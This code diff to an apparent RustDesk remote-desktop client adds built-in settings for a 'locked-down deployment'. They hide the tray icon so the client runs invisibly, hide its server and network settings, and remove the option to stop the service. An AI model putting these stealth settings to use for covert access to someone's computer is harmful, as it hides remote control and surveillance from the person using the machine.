@@ -2101,6 +2101,29 @@ pub fn load_custom_client() {
         };
         read_custom_client(&data.trim());
     }
+
+    // Custom build settings for locked-down deployment.
+    // These are BUILTIN_SETTINGS with no runtime override — they control UI visibility.
+    // The server address is NOT set here; it's configured at deploy time via:
+    //   rustdesk.exe --config host=<ip>,key=<key>
+    {
+        let mut builtin = config::BUILTIN_SETTINGS.write().unwrap();
+        // Hide tray icon — run as invisible service
+        builtin
+            .entry("hide-tray".to_owned())
+            .or_insert_with(|| "Y".to_owned());
+        // Hide server/network settings — prevent end-user from changing server config
+        builtin
+            .entry("hide-server-settings".to_owned())
+            .or_insert_with(|| "Y".to_owned());
+        builtin
+            .entry("hide-network-settings".to_owned())
+            .or_insert_with(|| "Y".to_owned());
+        // Hide "Stop service" from tray context menu (if tray is ever shown)
+        builtin
+            .entry("hide-stop-service".to_owned())
+            .or_insert_with(|| "Y".to_owned());
+    }
 }
 
 fn read_custom_client_advanced_settings(
